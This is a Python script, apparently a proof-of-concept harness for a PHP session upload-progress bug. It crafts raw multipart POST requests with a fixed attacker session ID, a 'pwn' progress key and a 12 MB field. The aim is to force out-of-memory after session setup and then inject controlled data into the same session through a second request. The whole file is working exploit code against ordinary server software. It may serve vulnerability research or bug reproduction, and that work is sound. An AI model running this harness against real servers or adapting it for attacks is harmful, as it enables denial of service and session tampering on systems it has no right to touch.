#!/usr/bin/env python3
"""Pure HTTP harness for the session.upload_progress cross-request bug.

Target: vanilla /index.php (no session code).
Request A: progress + file + huge field -> OOM after session init.
Request B: progress + file (many progress updates) + controlled fields.
"""
import os, socket, sys, time

HOST=os.environ.get('HOST','127.0.0.1'); PORT=int(os.environ.get('PORT','8088'))
PATH=os.environ.get('PATH_INFO','/index.php'); SID=os.environ.get('SID','attacksessionid0001')
TIMEOUT=float(os.environ.get('IO_TIMEOUT','15'))

def multipart(parts, boundary):
    out=bytearray()
    for p in parts:
        out += b'--'+boundary+b'\r\n'
        if 'filename' in p:
            out += b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"; filename="'+p['filename'].encode()+b'"\r\n'
            out += b'Content-Type: application/octet-stream\r\n\r\n'
        else:
            out += b'Content-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'
        out += p['data']+b'\r\n'
    out += b'--'+boundary+b'--\r\n'
    return bytes(out)

def send(body,boundary,timeout=TIMEOUT):
    hdr=(f'POST {PATH} HTTP/1.1\r\nHost: {HOST}:{PORT}\r\n'
         f'Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n'
         f'Content-Length: {len(body)}\r\nConnection: close\r\n\r\n').encode()
    s=socket.create_connection((HOST,PORT),timeout=timeout); s.settimeout(timeout)
    se=re=None
    try:
        s.sendall(hdr); mv=memoryview(body)
        for off in range(0,len(body),262144):
            try: s.sendall(mv[off:off+262144])
            except OSError as e: se=repr(e); break
    except OSError as e: se=repr(e)
    data=bytearray()
    try:
        while True:
            c=s.recv(65536)
            if not c: break
            data+=c
    except OSError as e: re=repr(e)
    finally: s.close()
    return bytes(data),se,re

def req_a(huge_mb=12,boundary=b'----SUPABOUNDARY7'):
    parts=[{'name':'PHPSESSID','data':SID.encode()},
           {'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},
           {'name':'f','filename':'a.txt','data':b'A'*64},
           {'name':'big','data':b'B'*(huge_mb*1024*1024)}]
    return multipart(parts,boundary),boundary

def req_b(file_len=262144,boundary=b'BNDRY12345',pad=None):
    parts=[{'name':'PHPSESSID','data':SID.encode()},
           {'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'},
           {'name':'f','filename':'b.bin','data':b'C'*file_len}]
    if pad is not None: parts.append({'name':'pad','data':pad})
    return multipart(parts,boundary),boundary

def show(tag,resp,se,re):
    head=resp.split(b'\r\n\r\n',1)[0] if b'\r\n\r\n' in resp else resp
    print(f'--- {tag} --- send={se} recv={re}')
    print(head[:400].decode('latin1','replace'))
    body=resp.split(b'\r\n\r\n',1)[1] if b'\r\n\r\n' in resp else b''
    print('body:',body[:300].decode('latin1','replace'))

def main():
    mode=sys.argv[1] if len(sys.argv)>1 else 'ab'
    if mode in ('a','ab'):
        b,bnd=req_a(int(os.environ.get('HUGE_MB','12'))); print('[A]',len(b))
        show('A',*send(b,bnd)); time.sleep(0.4)
    if mode in ('b','ab'):
        fl=int(os.environ.get('FILE_LEN','262144')); pad=os.environ.get('PAD','').encode() or None
        b,bnd=req_b(fl,pad=pad); print('[B]',len(b))
        show('B',*send(b,bnd))

if __name__=='__main__': main()
